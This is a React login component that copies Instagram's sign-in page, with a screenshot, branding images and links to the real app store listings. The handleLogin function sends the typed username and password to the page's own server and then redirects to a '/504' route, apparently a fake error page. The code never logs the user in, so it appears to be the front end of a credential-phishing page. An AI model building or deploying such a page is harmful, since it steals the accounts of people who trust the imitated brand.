import React,{useState,} from 'react';
import { useNavigate } from 'react-router-dom';
import "./Login.css";
import logo from "./Images/logo.png";
import lower from "./Images/lower.png";
import app from "./Images/app.png";
import google from "./Images/google.png";
import footer from "./Images/footer.png";

const Login = () => {

  const navigate = useNavigate();
  const [user,setUser] = useState({
    username: "", password: ""
  });

  const handleLogin = async (e) =>{
    e.preventDefault();

    const {username, password} = user;

    const res = await fetch('/',{
      method: 'POST',
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username, password
      })
    });

    const data = await res.json();
    navigate("/504");
  };


  return (
    <>
     <div className='container'>
          <div className='left'>
              <img src="https://i.imgur.com/P3Vm1Kq.png" alt="Instagram Screenshots"/>
          </div>
          <div className='right'>
            <div className='right_cont'>
              <div className = "upper">
                <img className='logo' src={logo} alt="Logo"/>
                <form method="POST" className='form'>
                  <input
                    type="text"
                    placeholder="Phone number, username or email address"
                    name="username"
                    id="username"
                    value={user.username}
                    onChange={(e) => setUser({...user,[e.target.name]: e.target.value})}
                    required
                  />
                  <input
                    type="password"
                    placeholder="Password"
                    name="password"
                    id="password"
                    value={user.password}
                    onChange={(e) => setUser({...user,[e.target.name]: e.target.value})}
                    required
                  />
                <div className='btn_container'>
                  <button className="btn" onClick={handleLogin}>Login</button>
                </div>
                </form>
                <div><img className='temp' src={lower} alt="Img unavailable" /></div>
              </div>
              <div className='lower'>
                <h4>Don't have an account? <span> Sign Up</span></h4>
              </div>
              <div className='last'> 
                <h4> Get the app.</h4>
                <div className='img_container'>
                    <div><a href="https://apps.apple.com/us/app/instagram/id389801252?vt=lo" rel="noreferrer" target="_blank"><img  src={app} alt="Img unavailable"/></a></div>
                    <div><a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D8F951C13-F722-4403-B853-C7B096976FBA%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%3A%2F%2Fwww.google.com%2F" rel="noreferrer" target="_blank"><img  src={google} alt="Img unavailable"/></a></div>
                </div>
              </div>
            </div>
          </div>
      </div>
      <div className='footer'>
        <img src={footer} alt="Img unavailable" />
      </div>
      
    </>
  );
}

export default Login;